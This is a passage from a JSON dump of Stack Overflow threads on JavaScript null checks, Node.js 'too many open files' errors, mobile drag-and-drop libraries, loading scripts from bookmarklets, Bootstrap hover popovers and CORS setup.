                    "body": "<p>An \u201cundefined variable\u201d is different from the value <code>undefined</code>.</p>\n\n<p>An undefined variable:</p>\n\n<pre><code>var a;\nalert(b); // ReferenceError: b is not defined\n</code></pre>\n\n<p>A variable with the value <code>undefined</code>:</p>\n\n<pre><code>var a;\nalert(a); // Alerts \u201cundefined\u201d\n</code></pre>\n\n<p>When a function takes an argument, that argument is always declared even if its value is <code>undefined</code>, and so there won\u2019t be any error. You are right about <code>!= null</code> followed by <code>!== undefined</code> being useless, though.</p>\n",
                    "is_accepted": true,
                    "score": 70
                },
                {
                    "body": "<p><code>typeof foo === \"undefined\"</code> is different from <code>foo === undefined</code>, never confuse them. <code>typeof foo === \"undefined\"</code> is what you really need. Also, use <code>!==</code> in place of <code>!=</code></p>\n\n<p>So the statement can be written as</p>\n\n<pre><code>function (data) {\n  if (typeof data !== \"undefined\" &amp;&amp; data !== null) {\n    // some code here\n  }\n}\n</code></pre>\n\n<p><strong>Edit:</strong></p>\n\n<p>You can not use <code>foo === undefined</code> for undeclared variables.</p>\n\n<pre><code>var t1;\n\nif(typeof t1 === \"undefined\")\n{\n  alert(\"cp1\");\n}\n\nif(t1 === undefined)\n{\n  alert(\"cp2\");\n}\n\nif(typeof t2 === \"undefined\")\n{\n  alert(\"cp3\");\n}\n\nif(t2 === undefined) // fails as t2 is never declared\n{\n  alert(\"cp4\");\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>In JavaScript, <code>null</code> is a special singleton object which is helpful for signaling \"no value\".  You can test for it by comparison and, as usual in JavaScript, it's a good practice to use the <code>===</code> operator to avoid confusing type coercion:</p>\n\n<pre><code>var a = null;\nalert(a === null); // true\n</code></pre>\n\n<p>As @rynah mentions, \"undefined\" is a bit confusing in JavaScript.  However, it's always safe to test if the <code>typeof(x)</code> is the string \"undefined\", even if \"x\" is not a declared variable:</p>\n\n<pre class=\"lang-javascript prettyprint-override\"><code>alert(typeof(x) === 'undefined'); // true\n</code></pre>\n\n<p>Also, variables can have the \"undefined value\" if they are not initialized:</p>\n\n<pre class=\"lang-javascript prettyprint-override\"><code>var y;\nalert(typeof(y) === 'undefined'); // true\n</code></pre>\n\n<p>Putting it all together, your check should look like this:</p>\n\n<pre class=\"lang-javascript prettyprint-override\"><code>if ((typeof(data) !== 'undefined') &amp;&amp; (data !== null)) {\n  // ...\n</code></pre>\n\n<p>However, since the variable \"data\" is always defined since it is a formal function parameter, using the \"typeof\" operator is unnecessary and you can safely compare directly with the \"undefined value\".</p>\n\n<pre class=\"lang-javascript prettyprint-override\"><code>function(data) {\n  if ((data !== undefined) &amp;&amp; (data !== null)) {\n    // ...\n</code></pre>\n\n<p>This snippet amounts to saying \"if the function was called with an argument which is defined and is not null...\"</p>\n",
                    "is_accepted": false,
                    "score": 25
                },
                {
                    "body": "<p>The simple way to do your test is : </p>\n\n<pre><code>function (data) {\n    if (data) { // check if null, undefined, empty ...\n        // some code here\n    }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><strong>Q:</strong> The function was called with no arguments, thus making data an undefined variable, and raising an error on data != null.</p>\n\n<p><strong>A:</strong> Yes, <code>data</code> will be set to undefined. See <a href=\"http://ecma262-5.com/ELS5_HTML.htm#Section_10.5\" rel=\"nofollow\">section 10.5 Declaration Binding Instantiation</a> of the spec. But accessing an undefined value does not raise an error. You're probably confusing this with accessing an undeclared variable in strict mode which does raise an error.</p>\n\n<p><strong>Q:</strong> The function was called specifically with null (or undefined), as its argument, in which case data != null already protects the inner code, rendering &amp;&amp; data !== undefined useless.</p>\n\n<p><strong>Q:</strong> The function was called with a non-null argument, in which case it will trivially pass both data != null and data !== undefined.</p>\n\n<p><strong>A:</strong> Correct. Note that the following tests are equivalent:</p>\n\n<pre><code>data != null\ndata != undefined\ndata !== null &amp;&amp; data !== undefined\n</code></pre>\n\n<p>See <a href=\"http://ecma262-5.com/ELS5_HTML.htm#Section_11.9.3\" rel=\"nofollow\">section 11.9.3 The Abstract Equality Comparison Algorithm</a> and <a href=\"http://ecma262-5.com/ELS5_HTML.htm#Section_11.9.6\" rel=\"nofollow\">section 11.9.6 The Strict Equality Comparison Algorithm</a> of the spec.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<pre><code>var a;\nalert(a); //Value is undefined\n\nvar b = \"Volvo\"; \nalert(b); //Value is Volvo\n\nvar c = null;\nalert(c); //Value is null\n</code></pre>\n",
                    "is_accepted": false,
                    "score": -3
                }
            ],
            "body": "<p>I've come across the following code:</p>\n\n<pre><code>function (data) {\n    if (data != null &amp;&amp; data !== undefined) {\n        // some code here\n    }\n}\n</code></pre>\n\n<p>I'm somewhat new to JavaScript, but, from other questions I've been reading here, I'm under the impression that this code does not make much sense.</p>\n\n<hr>\n\n<del>\nIn particular, <a href=\"http://stackoverflow.com/a/2559513/2088822\">this answer</a> states that\n</del>\n\n<blockquote>\n  <p><del>You'll get an error if you access an undefined variable in any context other than <code>typeof</code>. </del></p>\n</blockquote>\n\n<p><strong>Update:</strong> The (quote of the) answer above may be misleading. It should say <em>\u00aban undeclared variable\u00bb</em>, instead of <em>\u00aban undefined variable\u00bb</em>.</p>\n\n<p>As I found out, in the answers by <a href=\"http://stackoverflow.com/a/16672768/2088822\"><em>minitech</em></a>, <a href=\"http://stackoverflow.com/a/16673024/2088822\"><em>maerics</em></a>, and <a href=\"http://stackoverflow.com/a/16674810/2088822\"><em>nwellnhof</em></a>, even when no arguments are provided to a function, its variables for the arguments are always declared. This fact also proves wrong the first item in the list below.</p>\n\n<hr>\n\n<p>From my understanding, the following scenarios may be experienced:</p>\n\n<ul>\n<li><p><del>The function was called with no arguments, thus making <code>data</code> an undefined variable, and raising an error on <code>data != null</code>.</del></p></li>\n<li><p>The function was called specifically with <code>null</code> (or <code>undefined</code>), as its argument, in which case <code>data != null</code> already protects the inner code, rendering <code>&amp;&amp; data !== undefined</code> useless.</p></li>\n<li><p>The function was called with a non-null argument, in which case it will trivially pass both <code>data != null</code> <strong>and</strong> <code>data !== undefined</code>.</p></li>\n</ul>\n\n<p><strong>Q: Is my understanding correct?</strong></p>\n\n<hr>\n\n<p>I've tried the following, in Firefox's console:</p>\n\n<pre><code>--\n[15:31:31.057] false != null\n[15:31:31.061] true\n--\n[15:31:37.985] false !== undefined\n[15:31:37.989] true\n--\n[15:32:59.934] null != null\n[15:32:59.937] false\n--\n[15:33:05.221] undefined != null\n[15:33:05.225] false\n--\n[15:35:12.231] \"\" != null\n[15:35:12.235] true\n--\n[15:35:19.214] \"\" !== undefined\n[15:35:19.218] true\n</code></pre>\n\n<p>I can't figure out a case where the <code>data !== undefined</code> <strong>after</strong> <code>data != null</code> might be of any use.</p>\n",
            "last_activity_date": 1409220482,
            "question_id": 16672743,
            "score": 71,
            "tags": [
                "javascript",
                "null",
                "undefined"
            ],
            "title": "JavaScript null check"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>Your readying to many files at once. Node reads the files in async, so your be readying all files at once. try to pool your reading of files. You really dont want to read 10240 at once. One you have a 1gb memory limit with node. lol just wrote this for you see if it works. <a href=\"https://gist.github.com/1659615\" rel=\"nofollow\">https://gist.github.com/1659615</a></p>\n\n<pre><code>var fs = require('fs')\nvar events = require('events')\nvar util = require('util')\nvar path = require('path')\n\nvar FsPool = module.exports = function(dir) {\n    events.EventEmitter.call(this)\n    this.dir = dir;\n    this.files = [];\n    this.active = [];\n    this.threads = 1;\n    this.on('run', this.runQuta.bind(this))\n};\n// So will act like an event emitter\nutil.inherits(FsPool, events.EventEmitter);\n\nFsPool.prototype.runQuta = function() {\n    if(this.files.length === 0 &amp;&amp; this.active.length === 0) {\n        return this.emit('done');\n    }\n    if(this.active.length &lt; this.threads) {\n        var name = this.files.shift()\n\n        this.active.push(name)\n        var fileName = path.join(this.dir, name);\n        var self = this;\n        fs.stat(fileName, function(err, stats) {\n            if(err)\n                throw err;\n            if(stats.isFile()) {\n                fs.readFile(fileName, function(err, data) {\n                    if(err)\n                        throw err;\n                    self.active.splice(self.active.indexOf(name), 1)\n                    self.emit('file', name, data);\n                    self.emit('run');\n\n                });\n            } else {\n                self.active.splice(self.active.indexOf(name), 1)\n                self.emit('dir', name);\n                self.emit('run');\n            }\n        });\n    }\n    return this\n};\nFsPool.prototype.init = function() {\n    var dir = this.dir;\n    var self = this;\n    fs.readdir(dir, function(err, files) {\n        if(err)\n            throw err;\n        self.files = files\n        self.emit('run');\n    })\n    return this\n};\nvar fsPool = new FsPool(__dirname)\n\nfsPool.on('file', function(fileName, fileData) {\n    console.log('file name: ' + fileName)\n    console.log('file data: ', fileData.toString('utf8'))\n\n})\nfsPool.on('dir', function(dirName) {\n    console.log('dir name: ' + dirName)\n\n})\nfsPool.on('done', function() {\n    console.log('done')\n});\nfsPool.init()\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>With bagpipe, you just need change </p>\n\n<pre><code>FS.readFile(filename, onRealRead);\n</code></pre>\n\n<p>=></p>\n\n<pre><code>var bagpipe = new Bagpipe(10);\n\nbagpipe.push(FS.readFile, filename, onRealRead))\n</code></pre>\n\n<p>The bagpipe help you limit the parallel. more details: <a href=\"https://github.com/JacksonTian/bagpipe\" rel=\"nofollow\">https://github.com/JacksonTian/bagpipe</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I just finished writing a little snippet of code to solve this problem myself, all of the other solutions appear way too heavyweight and require you to change your program structure.</p>\n\n<p>This solution just stalls any fs.readFile or fs.writeFile calls so that there are no more than a set number in flight at any given time. </p>\n\n<pre><code>// Queuing reads and writes, so your nodejs script doesn't overwhelm system limits catastrophically\nglobal.maxFilesInFlight = 100; // Set this value to some number safeish for your system\nvar origRead = fs.readFile;\nvar origWrite = fs.writeFile;\n\nvar activeCount = 0;\nvar pending = [];\n\nvar wrapCallback = function(cb){\n    return function(){\n        activeCount--;\n        cb.apply(this,Array.prototype.slice.call(arguments));\n        if (activeCount &lt; global.maxFilesInFlight &amp;&amp; pending.length){\n            console.log(\"Processing Pending read/write\");\n            pending.shift()();\n        }\n    };\n};\nfs.readFile = function(){\n    var args = Array.prototype.slice.call(arguments);\n    if (activeCount &lt; global.maxFilesInFlight){\n        if (args[1] instanceof Function){\n            args[1] = wrapCallback(args[1]);\n        } else if (args[2] instanceof Function) {\n            args[2] = wrapCallback(args[2]);\n        }\n        activeCount++;\n        origRead.apply(fs,args);\n    } else {\n        console.log(\"Delaying read:\",args[0]);\n        pending.push(function(){\n            fs.readFile.apply(fs,args);\n        });\n    }\n};\n\nfs.writeFile = function(){\n    var args = Array.prototype.slice.call(arguments);\n    if (activeCount &lt; global.maxFilesInFlight){\n        if (args[1] instanceof Function){\n            args[1] = wrapCallback(args[1]);\n        } else if (args[2] instanceof Function) {\n            args[2] = wrapCallback(args[2]);\n        }\n        activeCount++;\n        origWrite.apply(fs,args);\n    } else {\n        console.log(\"Delaying write:\",args[0]);\n        pending.push(function(){\n            fs.writeFile.apply(fs,args);\n        });\n    }\n};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I ran into this problem today, and finding no good solutions for it, I created a module to address it. I was inspired by @fbartho's snippet, but wanted to avoid overwriting the fs module.</p>\n\n<p>The module I wrote is <a href=\"https://github.com/treygriffith/filequeue\" rel=\"nofollow\">Filequeue</a>, and you use it just like fs:</p>\n\n<pre><code>var Filequeue = require('filequeue');\nvar fq = new Filequeue(200); // max number of files to open at once\n\nfq.readdir('/Users/xaver/Downloads/xaver/xxx/xxx/', function(err, files) {\n    if(err) {\n        throw err;\n    }\n    files.forEach(function(file) {\n        fq.readFile('/Users/xaver/Downloads/xaver/xxx/xxx/' + file, function(err, data) {\n            // do something here\n        }\n    });\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Using the <a href=\"https://github.com/isaacs/node-graceful-fs\"><code>graceful-fs</code></a> module by Isaac Schlueter (node.js maintainer) is probably the most appropriate solution. It does incremental back-off if EMFILE is encountered. It can be used as a drop-in replacement for the built-in <code>fs</code> module.</p>\n",
                    "is_accepted": false,
                    "score": 23
                },
                {
                    "body": "<p>For when <a href=\"https://github.com/isaacs/node-graceful-fs\">graceful-fs</a> doesn't work... or you just want to understand where the leak is coming from.  Follow this process.  </p>\n\n<p>(e.g. graceful-fs isn't gonna fix your wagon if your issue is with sockets.)</p>\n\n<p>From My Blog Article: <a href=\"http://www.blakerobertson.com/devlog/2014/1/11/how-to-determine-whats-causing-error-connect-emfile-nodejs.html\">http://www.blakerobertson.com/devlog/2014/1/11/how-to-determine-whats-causing-error-connect-emfile-nodejs.html</a></p>\n\n<h2>How To Isolate</h2>\n\n<p>This command will output the number of open handles for nodejs processes:</p>\n\n<p><code>\nlsof -i -n -P | grep nodejs\n</code></p>\n\n<pre><code>COMMAND     PID    USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME\n...\nnodejs    12211    root 1012u  IPv4 151317015      0t0  TCP 10.101.42.209:40371-&gt;54.236.3.170:80 (ESTABLISHED)\nnodejs    12211    root 1013u  IPv4 151279902      0t0  TCP 10.101.42.209:43656-&gt;54.236.3.172:80 (ESTABLISHED)\nnodejs    12211    root 1014u  IPv4 151317016      0t0  TCP 10.101.42.209:34450-&gt;54.236.3.168:80 (ESTABLISHED)\nnodejs    12211    root 1015u  IPv4 151289728      0t0  TCP 10.101.42.209:52691-&gt;54.236.3.173:80 (ESTABLISHED)\nnodejs    12211    root 1016u  IPv4 151305607      0t0  TCP 10.101.42.209:47707-&gt;54.236.3.172:80 (ESTABLISHED)\nnodejs    12211    root 1017u  IPv4 151289730      0t0  TCP 10.101.42.209:45423-&gt;54.236.3.171:80 (ESTABLISHED)\nnodejs    12211    root 1018u  IPv4 151289731      0t0  TCP 10.101.42.209:36090-&gt;54.236.3.170:80 (ESTABLISHED)\nnodejs    12211    root 1019u  IPv4 151314874      0t0  TCP 10.101.42.209:49176-&gt;54.236.3.172:80 (ESTABLISHED)\nnodejs    12211    root 1020u  IPv4 151289768      0t0  TCP 10.101.42.209:45427-&gt;54.236.3.171:80 (ESTABLISHED)\nnodejs    12211    root 1021u  IPv4 151289769      0t0  TCP 10.101.42.209:36094-&gt;54.236.3.170:80 (ESTABLISHED)\nnodejs    12211    root 1022u  IPv4 151279903      0t0  TCP 10.101.42.209:43836-&gt;54.236.3.171:80 (ESTABLISHED)\nnodejs    12211    root 1023u  IPv4 151281403      0t0  TCP 10.101.42.209:43930-&gt;54.236.3.172:80 (ESTABLISHED)\n....\n</code></pre>\n\n<p><strong>Notice the: 1023u (last line)</strong> - that's the 1024th file handle which is the default maximum.</p>\n\n<p>Now, Look at the last column.  That indicates which resource is open.  You'll probably see a number of lines all with the same resource name.  Hopefully, that now tells you where to look in your code for the leak.</p>\n\n<p>If you don't know  multiple node processes, first lookup which process has pid 12111.  That'll tell you the process.</p>\n\n<p>In my case above, I noticed that there were a bunch of very similar IP Addresses. They were all <code>54.236.3.###</code>  By doing ip address lookups, was able to determine in my case it was pubnub related.</p>\n\n<h2>Command Reference</h2>\n\n<p>Use this syntax to determine how many open handles a process has open...</p>\n\n<h3>To get a count of open files for a certain pid</h3>\n\n<p>I used this command to test the number of files that were opened after doing various events in my app.</p>\n\n<p><code>lsof -i -n -P | grep \"8465\" | wc -l</code></p>\n\n<pre><code># lsof -i -n -P | grep \"nodejs.*8465\" | wc -l\n28\n# lsof -i -n -P | grep \"nodejs.*8465\" | wc -l\n31\n# lsof -i -n -P | grep \"nodejs.*8465\" | wc -l\n34\n</code></pre>\n\n<h3>What is your process limit?</h3>\n\n<p><code>\nulimit -a\n</code></p>\n\n<p>The line you want will look like this:\n<code>\nopen files                      (-n) 1024\n</code></p>\n",
                    "is_accepted": false,
                    "score": 20
                }
            ],
            "body": "<p>For some days I have searched for a working solution to an error </p>\n\n<p><code>Error: EMFILE, too many open files</code></p>\n\n<p>It seems that many people have the same problem. The usual answer involves increasing the number of file descriptors. So, I've tried this: </p>\n\n<p><code>sysctl -w kern.maxfiles=20480</code>, </p>\n\n<p>The default value is 10240. This is a little strange in my eyes, because the number of files I'm handling in the directory is under 10240. Even stranger, I still receive the same error after I've increased the number of file descriptors.</p>\n\n<p>Second question: </p>\n\n<p>After a number of searches I found a work around for the \"too many open files\" problem:</p>\n\n<pre><code>var requestBatches = {};\nfunction batchingReadFile(filename, callback) {\n  // First check to see if there is already a batch\n  if (requestBatches.hasOwnProperty(filename)) {\n    requestBatches[filename].push(callback);\n    return;\n  }\n\n  // Otherwise start a new one and make a real request\n  var batch = requestBatches[filename] = [callback];\n  FS.readFile(filename, onRealRead);\n\n  // Flush out the batch on complete\n  function onRealRead() {\n    delete requestBatches[filename];\n    for (var i = 0, l = batch.length; i &lt; l; i++) {\n      batch[i].apply(null, arguments);\n    }\n  }\n}\n\nfunction printFile(file){\n    console.log(file);\n}\n\ndir = \"/Users/xaver/Downloads/xaver/xxx/xxx/\"\n\nvar files = fs.readdirSync(dir);\n\nfor (i in files){\n    filename = dir + files[i];\n    console.log(filename);\n    batchingReadFile(filename, printFile);\n</code></pre>\n\n<p>Unfortunately I still recieve the same error.\nWhat is wrong with this code?</p>\n\n<p>One last question (I'm new to javascript and node), I'm in the process of developping a web\napplication with a lot of requests for about 5000 daily users. I've many years of experience in\nprogramming with other languages like python and java. so originally I thought to developp this application with django or play framework. Then I discovered node and I must say that the idea of non-blocking I/O model is really nice, seductive, and most of all very fast!</p>\n\n<p>But what kind of problems should I expect with node? Is it a production proven web server? What are your experiences?</p>\n",
            "last_activity_date": 1414633562,
            "question_id": 8965606,
            "score": 57,
            "tags": [
                "javascript",
                "osx",
                "node.js",
                "file-descriptor"
            ],
            "title": "node and Error: EMFILE, too many open files"
        },
        {
            "answer_count": 13,
            "answers": [
                {
                    "body": "<p>I'm a big fan of <a href=\"http://www.sencha.com/products/touch/\" rel=\"nofollow\">Sencha Touch</a>.</p>\n\n<p>Here's there drag and drop demo - <a href=\"http://dev.sencha.com/deploy/touch/examples/dragdrop/\" rel=\"nofollow\">http://dev.sencha.com/deploy/touch/examples/dragdrop/</a>.</p>\n\n<p><strong>Note:</strong> Tested on my iPhone 4 in Safari.</p>\n",
                    "is_accepted": false,
                    "score": 14
                },
                {
                    "body": "<p>Try dojo. It works pretty well and it is a relatively mature toolkit. <a href=\"http://dojotoolkit.org/\" rel=\"nofollow\">http://dojotoolkit.org/</a></p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>Here's two built in jQuery:</p>\n\n<p><a href=\"http://www.stevefenton.co.uk/cmsfiles/assets/File/mobiledragdrop.html\" rel=\"nofollow\">http://www.stevefenton.co.uk/cmsfiles/assets/File/mobiledragdrop.html</a></p>\n\n<p><a href=\"http://code.google.com/p/jquery-ui-for-ipad-and-iphone/\" rel=\"nofollow\">http://code.google.com/p/jquery-ui-for-ipad-and-iphone/</a></p>\n\n<p>There is also the jquery mobile framework (which does not have drag and drop nativly):\n<a href=\"http://jquerymobile.com/\" rel=\"nofollow\">http://jquerymobile.com/</a></p>\n",
                    "is_accepted": false,
                    "score": 28
                },
                {
                    "body": "<p><a href=\"http://jquerymobile.com/test/\" rel=\"nofollow\">JQuery Mobile</a> is trying to support a large variety of <a href=\"http://jquerymobile.com/test/docs/about/platforms.html\" rel=\"nofollow\">platforms</a></p>\n\n<p>And here is a specific plugins for <a href=\"http://www.stevefenton.co.uk/cmsfiles/assets/File/mobiledragdrop.html\" rel=\"nofollow\">Drag and Drop</a></p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>I'm not sure if its exactly what you're looking for, but you could try <a href=\"http://www.phonegap.com/\" rel=\"nofollow\">PhoneGap</a> or maybe <a href=\"http://xuijs.com/\" rel=\"nofollow\">XUI</a>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Check out <a href=\"http://sproutcore.com/\" rel=\"nofollow\">SproutCore</a>. It's a framework created by former Apple engineers and is used by Apple in MobileMe and iCloud web apps. It has <a href=\"http://docs.sproutcore.com/symbols/SC.Drag.html\" rel=\"nofollow\">SC.Drag</a> which works with both mouse and touch events.</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>If you are building web apps for ios you must try jquery mobile.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><a href=\"http://www.kendoui.com/\" rel=\"nofollow\">http://www.kendoui.com/</a> this should work. Has d'n'd too, even though it's still in Beta.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<ul>\n<li>zepto (smallest, iOS 4+, Android 2.2+, webOS 1.4.5+)</li>\n<li>jquery, jquerymobile, jqtouch </li>\n<li>prototype</li>\n<li>sencha, senchatouch</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>hi there i use this jquery plugin:\n<a href=\"https://github.com/LuvDaSun/jdrag\" rel=\"nofollow\">https://github.com/LuvDaSun/jdrag</a></p>\n\n<p>It provides some drag events</p>\n\n<p>let me know if you find any bugs, the code is quite new!</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>This is still in alpha:  <a href=\"http://prettydiff.com/jsgui\" rel=\"nofollow\">http://prettydiff.com/jsgui</a></p>\n\n<p>It is persistent even after you close or refresh your browser and it will work in any modern browser.  Furthermore it is not a framework.  You can use this without other frameworks and you can customize it to do what you want.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You can use jquery UI for drag and drop and an additional library that maps touch events to their mouse event analogs.I think this should solve your problem:</p>\n\n<p><a href=\"https://github.com/yeco/jquery-ui-touch-punch\" rel=\"nofollow\">https://github.com/yeco/jquery-ui-touch-punch</a></p>\n\n<blockquote>\n  <p>To add touch events, just include the jquery.ui.touch-punch.min.js\n  script after your jquery.ui scripts.</p>\n</blockquote>\n\n<p>DEMOS:</p>\n\n<p><a href=\"http://furf.com/exp/touch-punch/\" rel=\"nofollow\">http://furf.com/exp/touch-punch/</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><a href=\"https://github.com/taye/interact.js#interactjs\" rel=\"nofollow\">interact.js</a> is a standalone and very lightweight drag-and-drop, resize and multi-touch gesture javascript module. It works on iOS, Android, Chrome, Firefox, Opera and IE8+ with support for interacting with <a href=\"http://taye.me/interact.js/demo/html_svg.html\" rel=\"nofollow\">HTML and SVG</a> elements. Something to note in advance is that it's up to the developer to respond to drag events but I think that's a good thing.</p>\n\n<p>To allow the whole page to be panned by dragging, you could run:</p>\n\n<pre><code>// make an Interactable of the document body element\ninteract(document.body)\n    // make a draggable of the Interactable\n    .draggable({\n        // on(drag)move\n        // could also have done interact(document.body).draggable(true).ondragmove = function...\n        onmove: function (event) {\n            x += event.dx;\n            y += event.dy;\n\n            // translate the document body by the change in pointer position\n            document.body.style.translate = 'translate(' + x + 'px, ' + y + 'px)';\n        }\n    })\n</code></pre>\n\n<p>It's still under development and there are many features planned but the API is unlike to change dramatically.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Does anyone know of a JS framework that has drag and drop functionality and is compatible with mobile (iOS) and regular browsers?</p>\n\n<p>I currently have a web-based app and it is a hassle to make its drag'n'drop functionality  work on iOS... I wish there was one that would do it for both...</p>\n",
            "last_activity_date": 1377613041,
            "question_id": 7168514,
            "score": 53,
            "tags": [
                "javascript",
                "jquery",
                "ios",
                "mobile",
                "drag-and-drop"
            ],
            "title": "JS library (with drag n drop) compatible with iOS and regular browsers"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Use a bookmarklet that creates a script tag which includes your external JS.</p>\n\n<p>As a sample:</p>\n\n<pre><code>javascript:(function(){document.body.appendChild(document.createElement('script')).src='** your external file URL here **';})();\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 70
                },
                {
                    "body": "<p>Firefox and perhaps others support multiline bookmarklets, no need for one liner. When you paste in the code it just replaces newlines with spaces.</p>\n\n<pre><code>javascript:\nvar q = document.createElement('script');\nq.src='http://svnpenn.github.io/bm/yt.js';\ndocument.body.appendChild(q);\nvoid 0;\n</code></pre>\n\n<p><a href=\"http://github.com/svnpenn/bm/blob/ad7e0c6/index.htm#L27-L32\" rel=\"nofollow\">Example</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>How can I load an external Javascript file using a bookmarklet?  This would overcome the URL length limitations of IE and generally keep things cleaner.</p>\n",
            "last_activity_date": 1385964810,
            "question_id": 106425,
            "score": 51,
            "tags": [
                "javascript",
                "load",
                "external",
                "bookmarklet"
            ],
            "title": "Load external JS from bookmarklet?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Set the <code>trigger</code> option of the popover to <strong><code>hover</code></strong> instead of <code>click</code>, which is the <a href=\"http://twitter.github.com/bootstrap/javascript.html#popovers\">default</a> one.</p>\n\n<p>This can be done using either <code>data-*</code> attributes in the markup:</p>\n\n<pre><code>&lt;a id=\"popover\" data-trigger=\"hover\"&gt;Popover&lt;/a&gt;\n</code></pre>\n\n<p>Or with an initialization option:</p>\n\n<pre><code>$(\"#popover\").popover({ trigger: \"hover\" });\n</code></pre>\n\n<p>Here's a <strong><a href=\"http://jsfiddle.net/9P64a/\">DEMO</a></strong>.</p>\n",
                    "is_accepted": true,
                    "score": 125
                },
                {
                    "body": "<p>I'd like to add that for accessibility, I think you should add focus trigger :</p>\n\n<p>i.e. <code>$(\"#popover\").popover({ trigger: \"hover focus\" });</code></p>\n",
                    "is_accepted": false,
                    "score": 11
                },
                {
                    "body": "<p>If you want to hover the popover itself as well you have to use a manual trigger.</p>\n\n<p>This is what i came up with: </p>\n\n<pre><code>function enableThumbPopover() {\n    var counter;\n\n    $('.thumbcontainer').popover({\n        trigger: 'manual',\n        animation: false,\n        html: true,\n        title: function () {\n            return $(this).parent().find('.thumbPopover &gt; .title').html();\n        },\n        content: function () {\n            return $(this).parent().find('.thumbPopover &gt; .body').html();\n        },\n        container: 'body',\n        placement: 'auto'\n    }).on(\"mouseenter\",function () {\n        var _this = this; // thumbcontainer\n\n        console.log('thumbcontainer mouseenter')\n        // clear the counter\n        clearTimeout(counter);\n        // Close all other Popovers\n        $('.thumbcontainer').not(_this).popover('hide');\n\n        // start new timeout to show popover\n        counter = setTimeout(function(){\n            if($(_this).is(':hover'))\n            {\n                $(_this).popover(\"show\");\n            }\n            $(\".popover\").on(\"mouseleave\", function () {\n                $('.thumbcontainer').popover('hide');\n            });\n        }, 400);\n\n    }).on(\"mouseleave\", function () {\n        var _this = this;\n\n        setTimeout(function () {\n            if (!$(\".popover:hover\").length) {\n                if(!$(this).is(':hover'))\n                {\n                    $(_this).popover('hide');\n                }\n            }\n        }, 200);\n    });\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The functionality, you described, can be easily achieved using the Bootstrap tooltip.</p>\n\n<pre><code>&lt;button id=\"example1\" type=\"button\" class=\"btn btn-default\" data-toggle=\"tooltip\"\ndata-placement=\"left\" title=\"Tooltip on left\"&gt;Tooltip on left&lt;/button&gt;\n</code></pre>\n\n<p>Then call tooltip() function for the element.</p>\n\n<pre><code>$('#example1').tooltip();\n</code></pre>\n\n<p><a href=\"http://getbootstrap.com/javascript/#tooltips\" rel=\"nofollow\">http://getbootstrap.com/javascript/#tooltips</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm just going through making a website to learn coding and was working with Bootstrap's <a href=\"http://twitter.github.com/bootstrap/javascript.html#popovers\">Popover</a>. </p>\n\n<p>It's a really cool script, but I can't figure out how to make the popover appear on hover instead of click. All of the other documentation on the site has been pretty easy to understand, but I really don't know much about jquery/javascript and can't figure this out.</p>\n\n<p>So basically, all I want to do is just have someone hover a link instead of clicking on it and a popover showing up and then someone not hover on the link and for the popover to go away. It says it's possible via data attribute or jquery, but I'd much rather have it be done with Jquery since I have multiple popovers. </p>\n\n<p>Thanks for all help!</p>\n",
            "last_activity_date": 1423031293,
            "question_id": 12343695,
            "score": 41,
            "tags": [
                "javascript",
                "jquery",
                "twitter-bootstrap"
            ],
            "title": "Make Bootstrap Popover Appear/Disappear on Hover instead of Click"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>I can't promise that I have time to write working example but I can show you 2 paths :)</p>\n\n<p>The biggest deal is CORS. After you solve that problem it is easy to use <a href=\"http://docs.angularjs.org/api/ng.%24http\" rel=\"nofollow\">$http</a> service. So, first and probably easiest may be to configure reverse proxy in x.com webserver which points to api.x.com. I wrote article <a href=\"http://stackoverflow.com/questions/10304198/crud-jsonp-sencha-touch-2/12047315#12047315\">here</a></p>\n\n<p>Second approach is better, and created for exactly this purpose, to authorise specific domain to use your resource. It involves a bit of coding in api.x.com so you don't have to change anything in new web applications served in other domains. You simply need to authorise CORS requests in api.x.com service.</p>\n\n<ul>\n<li>Create table in database where you can manage list of authorised domains</li>\n<li>Add in that table record \"x.com\"</li>\n<li>in api.x.com add request filter/interceptor what ever tech term you use for method which should be invoked after request is handled and add in response <code>Access-Control-Allow-Origin: x.com</code> if request comes from x.com (in other words check in request header refer value match to any value in table above and put that value in Access-Control-Allow-Origin response header). </li>\n</ul>\n\n<p>That is all :) After this if you know how to use <a href=\"http://docs.angularjs.org/api/ng.%24http\" rel=\"nofollow\">$http</a> or <a href=\"http://api.jquery.com/jQuery.ajax/\" rel=\"nofollow\">jQuey.ajax</a> you will be able to POST/PUT/DELETE/... any request to api.x.com from any authorised domain in just few minutes.</p>\n",
                    "is_accepted": false,
